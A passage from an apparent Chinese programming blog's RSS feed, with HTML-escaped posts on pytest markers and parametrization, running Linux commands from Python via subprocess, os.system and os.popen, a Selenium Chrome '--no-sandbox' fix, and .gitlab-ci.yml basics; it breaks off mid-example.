     &lt;span style=&#34;color:#a6e22e&#34;&gt;@pytest&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mark&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;skipif(condition, reason&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;xxx&amp;#34;&lt;/span&gt;) 
&lt;span style=&#34;color:#75715e&#34;&gt;# 使用----------------------------------------------------------------------&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Test_ABC&lt;/span&gt;:    
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_a&lt;/span&gt;(self):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;@pytest&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mark&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;skipif(condition&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,reason &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;跳过该函数&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# 跳过测试函数test_b&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_b&lt;/span&gt;(self):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_c&lt;/span&gt;(self):
        pytest&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;skip()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;13标记为预期失败函数&#34;&gt;13.标记为预期失败函数&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 标记测试函数为失败函数&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 方法：&lt;/span&gt;
     xfail(condition&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;, reason&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;, raises&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;, run&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;, strict&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# 常用参数：&lt;/span&gt;
     condition: 预期失败的条件, 必传参数
     reason: 失败的原因, 必传参数
&lt;span style=&#34;color:#75715e&#34;&gt;# 使用方法:&lt;/span&gt;
     &lt;span style=&#34;color:#a6e22e&#34;&gt;@pytest&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mark&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;xfail(condition, reason&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;xx&amp;#34;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# 使用----------------------------------------------------------------------&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Test_ABC&lt;/span&gt;:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_a&lt;/span&gt;(self):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;@pytest&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mark&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;xfail(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, reason&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;标注为预期失败&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# 标记为预期失败函数test_b&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_b&lt;/span&gt;(self):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_c&lt;/span&gt;(self):
        pytest&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;xfail()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;14函数数据参数化&#34;&gt;14.函数数据参数化&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 方便测试函数对测试属于的获取。&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 方法：&lt;/span&gt;
     parametrize(argnames, argvalues, indirect&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;, ids&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;, scope&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# 常用参数：&lt;/span&gt;
     argnames: 参数名
     argvalues: 参数对应值, 类型必须为list
           当参数为一个时格式: [value]
           当参数个数大于一个时, 格式为: [(param_value1,param_value2&lt;span style=&#34;color:#f92672&#34;&gt;.....&lt;/span&gt;),(param_value1,param_value2&lt;span style=&#34;color:#f92672&#34;&gt;.....&lt;/span&gt;)]
&lt;span style=&#34;color:#75715e&#34;&gt;# 使用方法:&lt;/span&gt;
     &lt;span style=&#34;color:#a6e22e&#34;&gt;@pytest&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mark&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;parametrize(argnames,argvalues)
&lt;span style=&#34;color:#75715e&#34;&gt;# 使用----------------------------------------------------------------------&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;@pytest&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mark&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;parametrize(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;,[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;]) &lt;span style=&#34;color:#75715e&#34;&gt;# a参数被赋予两个值，函数会运行两遍&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;@pytest&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mark&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;parametrize(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a,b&amp;#34;&lt;/span&gt;,[(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;),(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)]) &lt;span style=&#34;color:#75715e&#34;&gt;# 参数a,b均被赋予两个值，函数会运行两遍&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;return_test_data&lt;/span&gt;():
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; [(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;),(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)]
&lt;span style=&#34;color:#a6e22e&#34;&gt;@pytest&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mark&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;parametrize(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a,b&amp;#34;&lt;/span&gt;,return_test_data()) &lt;span style=&#34;color:#75715e&#34;&gt;# 使用函数返回值的形式传入参数值&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;15使用自定义标记mark只执行部分用例&#34;&gt;15.使用自定义标记mark只执行部分用例&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;@pytest.mark.webtest
&lt;span style=&#34;color:#75715e&#34;&gt;# 标记测试函数为 webtest 执行时可进行选择&lt;/span&gt;
pytest -v -m webtest
pytest -v -m &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;not webtest&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;16执行对应严重级别用例&#34;&gt;16.执行对应严重级别用例&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;pytest --allure-severities&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;critical
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Python—执行 Linux 命令</title>
        <link>https://ac-lm.github.io/posts/python/python%E6%89%A7%E8%A1%8C-linux-%E5%91%BD%E4%BB%A4/</link>
        <pubDate>Thu, 14 Jan 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/python%E6%89%A7%E8%A1%8C-linux-%E5%91%BD%E4%BB%A4/</guid>
        <description>&lt;h2 id=&#34;1subprocess-模块&#34;&gt;1.subprocess 模块&lt;/h2&gt;
&lt;p&gt;根据 Python 官方文档说明，subprocess模块用于取代下面这些模块。推荐使用&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; subprocess &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; call  
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; call([&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ls&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-l&amp;#34;&lt;/span&gt;])
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2os-模块的-system-方法&#34;&gt;2.os 模块的 system 方法&lt;/h2&gt;
&lt;p&gt;system方法会创建子进程运行外部程序，方法只返回外部程序的运行结果。这个方法比较适用于外部程序没有输出结果的情况。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&amp;gt;&amp;gt;&amp;gt; import os  
&amp;gt;&amp;gt;&amp;gt; os.system&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;echo \&amp;#34;Hello World\&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;   &lt;span style=&#34;color:#75715e&#34;&gt;# 直接使用os.system调用一个echo命令  &lt;/span&gt;
Hello World      ——————&amp;gt; 打印命令结果  
&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;                ——————&amp;gt; What’s this ? 返回值？  
&amp;gt;&amp;gt;&amp;gt; val &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os.system&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ls -al | grep \&amp;#34;log\&amp;#34; &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;   &lt;span style=&#34;color:#75715e&#34;&gt;# 使用val接收返回值  &lt;/span&gt;
-rw-r--r--  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root  root  &lt;span style=&#34;color:#ae81ff&#34;&gt;6030829&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt; 15:14 log    ——————&amp;gt; 此时只打印了命令结果  
&amp;gt;&amp;gt;&amp;gt; print val             
&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;                ——————&amp;gt; 注意，此时命令正常运行时，返回值是0  
&amp;gt;&amp;gt;&amp;gt; val &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os.system&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ls -al | grep \&amp;#34;log1\&amp;#34; &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;  
&amp;gt;&amp;gt;&amp;gt; print val         
&lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;             ——————&amp;gt; 使用os.system调用一个没有返回结果的命令，返回值为256～  
&amp;gt;&amp;gt;&amp;gt;   
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3os-模块的-popen-方法&#34;&gt;3.os 模块的 popen 方法&lt;/h2&gt;
&lt;p&gt;当需要得到外部程序的输出结果时，本方法非常有用，返回一个类文件对象，调用该对象的read()或readlines()方法可以读取输出内容。比如使用urllib调用Web API时，需要对得到的数据进行处理。os.popen(cmd) 要得到命令的输出内容，只需再调用下read()或readlines()等 如a=os.popen(cmd).read()&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&amp;gt;&amp;gt;&amp;gt; os.popen&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ls -lt&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;                  &lt;span style=&#34;color:#75715e&#34;&gt;# 调用os.popen（cmd）并不能得到我们想要的结果  &lt;/span&gt;
&amp;lt;open file &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ls -lt &amp;#39;&lt;/span&gt;, mode &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;r&amp;#39;&lt;/span&gt; at 0xb7585ee8&amp;gt;  
&amp;gt;&amp;gt;&amp;gt; print os.popen&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ls -lt&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.read&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;     &lt;span style=&#34;color:#75715e&#34;&gt;# 调用read()方法可以得到命令的结果  &lt;/span&gt;
total &lt;span style=&#34;color:#ae81ff&#34;&gt;6064&lt;/span&gt;  
-rwxr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; long       long            &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt; Jan  &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; 21:00 hello.sh  
-rw-r--r-- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; long       long           &lt;span style=&#34;color:#ae81ff&#34;&gt;147&lt;/span&gt; Jan  &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; 20:26 Makefile  
drwxr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; long       long          &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Jan  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; 19:37 test  
-rw-r--r-- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root       root       &lt;span style=&#34;color:#ae81ff&#34;&gt;6030829&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt; 15:14 log  
drwxr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; long       long          &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; 09:36 pip_build_long  
drwx------ &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; Debian-gdm Debian-gdm    &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt; 19:08 pulse-gylJ5EL24GU9  
drwx------ &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; long       long          &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt; Jan  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;1970&lt;/span&gt; orbit-long  
&amp;gt;&amp;gt;&amp;gt; val &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os.popen&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ls -lt&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.read&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;     &lt;span style=&#34;color:#75715e&#34;&gt;# 使用变量可以接收命令返回值  &lt;/span&gt;
&amp;gt;&amp;gt;&amp;gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log&amp;#34;&lt;/span&gt; in val:                    &lt;span style=&#34;color:#75715e&#34;&gt;# 我们可以使用in来判断返回值中有木有一个字符串  &lt;/span&gt;
...     print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Haha,there is the log&amp;#34;&lt;/span&gt;  
... &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:  
...     print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;No,not happy&amp;#34;&lt;/span&gt;  
...  
Haha,there is the log  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>BUG—Linux 无法启动 Chrome</title>
        <link>https://ac-lm.github.io/posts/bug/buglinux-%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8-chrome/</link>
        <pubDate>Wed, 13 Jan 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/bug/buglinux-%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8-chrome/</guid>
        <description>&lt;h2 id=&#34;bug-描述&#34;&gt;BUG 描述&lt;/h2&gt;
&lt;p&gt;linux 下 Python 脚本 selenium 无法启动 Chrome，报错&lt;/p&gt;
&lt;p&gt;&lt;code&gt;unknown error: DevToolsActivePort file doesn&#39;t exist&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;resolution&#34;&gt;Resolution&lt;/h2&gt;
&lt;p&gt;Chrome 在 Linux 下权限不足，需要添加以下属性以 Root 运行&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;options&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_argument(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;--no-sandbox&amp;#39;&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# 不在沙盒运行，以 Root 权限运行&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Git—.gitlab-ci 文件配置</title>
        <link>https://ac-lm.github.io/posts/git/git.gitlab-ci-%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE/</link>
        <pubDate>Wed, 13 Jan 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/git/git.gitlab-ci-%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://blog.51cto.com/7072753/2457095&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; .gitlab-ci.yml语法  @hellojinni  &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1gitlab-ciyml-文件&#34;&gt;1.&lt;code&gt;.gitlab-ci.yml&lt;/code&gt; 文件&lt;/h2&gt;
&lt;p&gt;GitLab CI 使用 YAML文件—.gitlab-ci.yml 来管理项目配置，用来配置 CI 在你的项目中做哪些操作，这个文件位于仓库的根目录。&lt;/p&gt;
&lt;p&gt;当新内容 push 到仓库或者有代码合并后， GitLab 会查找是否有 .gitlab-ci.yml 文件，如果文件存在， Runners 将会根据该文件的内容开始 build 本次 commit 。&lt;/p&gt;
&lt;p&gt;.gitlab-ci.yml 使用 YAML 语法， 你需要格外注意缩进格式，要用空格来缩进，不能用 tabs 来缩进。&lt;/p&gt;
&lt;h2 id=&#34;2stages&#34;&gt;2.Stages&lt;/h2&gt;
&lt;p&gt;Stages 表示构建阶段，说白了就是上面提到的流程。默认有3个 stages ： build , test , deploy 。我们可以在一次 Pipeline 中定义多个 Stages ，这些 Stages 会有以下特点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;所有 Stages 会按照顺序运行，即当一个 Stage 完成后，下一个 Stage 才会开始&lt;/li&gt;
&lt;li&gt;只有当所有 Stages 完成后，该构建任务 (Pipeline) 才会成功&lt;/li&gt;
&lt;li&gt;如果任何一个 Stage 失败，那么后面的 Stages 不会执行，该构建任务 (Pipeline) 失败&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3jobs&#34;&gt;3.Jobs&lt;/h2&gt;
&lt;p&gt;Jobs 表示构建工作，表示某个 Stage 里面执行的工作。我们可以在 Stages 里面定义多个 Jobs ，Jobs 是由 Runners 接管并且由服务器中 runner 执行。这些 Jobs 会有以下特点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;每一个 Jobs 的执行过程都是独立运行的&lt;/li&gt;
&lt;li&gt;相同 Stage 中的 Jobs 会并行执行&lt;/li&gt;
&lt;li&gt;相同 Stage 中的 Jobs 都执行成功时，该 Stage 才会成功&lt;/li&gt;
&lt;li&gt;如果任何一个 Job 失败，那么该 Stage 失败，即该构建任务 (Pipeline) 失败&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;4约束&#34;&gt;4.约束&lt;/h2&gt;
&lt;p&gt;YAML 文件定义了一系列带有约束说明的任务。这些任务都是以任务名开始并且至少要包含 script 部分。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;job1&lt;/span&gt;:
  &lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;execute-script-for-job1&amp;#34;&lt;/span&gt;
  
&lt;span style=&#34;color:#f92672&#34;&gt;job2&lt;/span&gt;:
  &lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;execute-script-for-job2&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;5跳过job&#34;&gt;5.跳过job&lt;/h2&gt;
&lt;p&gt;如果你的 commit 信息包涵 ci skip 或者 skip ci ，不论大小写，这个 commit 将会被创建，但是 job 会被跳过&lt;/p&gt;
&lt;h2 id=&#34;6开始&#34;&gt;6.开始&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;before_script&lt;/span&gt;:
  - &lt;span style=&#34;color:#ae81ff&#34;&gt;echo &amp;#34;每个job之前都会执行&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;7结束&#34;&gt;7.结束&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;after_script&lt;/span&gt;:
  - &lt;span style=&#34;color:#ae81ff&#34;&gt;echo &amp;#34;每个job之后都会执行&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;8示例&#34;&gt;8.示例&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 定义 stages（阶段）。任务将按此顺序执行。&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;stages&lt;/span&gt;:
  - &lt;span style=&#34;color:#ae81ff&#34;&gt;build&lt;/span&gt;
